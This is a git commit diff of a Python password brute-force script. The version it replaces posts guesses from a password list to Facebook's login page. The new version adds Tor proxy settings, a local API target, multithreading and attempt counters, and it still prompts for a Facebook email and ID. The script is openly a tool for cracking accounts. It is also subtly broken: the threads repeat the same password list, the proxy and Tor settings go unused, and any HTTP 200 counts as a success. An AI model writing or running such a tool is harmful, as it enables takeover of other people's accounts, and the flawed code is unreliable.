b457f03fc922696ae81bdf491c6285f6671c957a
Kamil01 <107310243+Adminek01@users.noreply.github.com>
2023-11-23 10:55:34 +0100

    Update brute_force.py

--- brute_force.py
+++ brute_force.py
@@ -1,20 +1,33 @@
 import requests
+import threading
+import time
+from requests.auth import HTTPProxyAuth
 
-# Function to perform brute force attack without proxy
-def brute_force(username, fb_id, passwords):
+# Global variables
+tor_proxy_ip = "127.0.0.1"
+tor_proxy_port = "9050"
+tor_proxy_auth = HTTPProxyAuth('your_tor_proxy_username', 'your_tor_proxy_password')
+local_api_url = "http://127.0.0.1:5000/your-api-endpoint"
+attempts = 0
+successful_attempts = 0
+
+# Function to perform brute force attack without Tor proxy
+def brute_force(username, fb_id, passwords, proxy=None):
+    global attempts, successful_attempts
+
     for password in passwords:
+        attempts += 1
         try:
-            # Example: Make a request to Facebook login without using a proxy
-            result = requests.post('https://www.facebook.com/login.php',
-                                   data={'email': username, 'pass': password},
-                                   timeout=10)
+            proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'} if proxy else None
 
-            # Check if login was successful (you need to customize this based on Facebook's response)
-            if 'Welcome to Facebook' in result.text:
-                print(f"Login successful! Username: {username}, Password: {password}")
-                break
-            else:
-                print(f"Login failed for Password: {password}")
+            # Example: Make a request to the local API without using a proxy
+            result = requests.get(local_api_url, params={'username': username, 'password': password},
+                                  proxies=proxies, timeout=10)
+
+            # Process result as needed
+            if result.status_code == 200:
+                successful_attempts += 1
+                print(f"Successful attempt - Username: {username}, Password: {password}")
         except requests.exceptions.RequestException as e:
             print(f"Request Error: {e}")
 
@@ -25,6 +38,7 @@ def read_passwords(file_path):
 
 # Function to execute the main brute-force attack
 def main():
+    global attempts, successful_attempts
     username = input("Enter email address (as username): ")
     fb_id = input("Enter Facebook ID: ")
     password_file = input("Enter the password file name: ")
@@ -32,8 +46,22 @@ def main():
     # Read passwords from file
     passwords = read_passwords(password_file)
 
-    # Perform brute-force attack
-    brute_force(username, fb_id, passwords)
+    # Multi-threading
+    threads = []
+    num_threads = 5  # Adjust the number of threads as needed
+
+    for i in range(num_threads):
+        t = threading.Thread(target=brute_force, args=(username, fb_id, passwords))
+        threads.append(t)
+        t.start()
+
+    # Wait for all threads to finish
+    for t in threads:
+        t.join()
+
+    # Print statistics
+    print(f"\nTotal attempts: {attempts}")
+    print(f"Successful attempts: {successful_attempts}")
 
 if __name__ == '__main__':
     main()
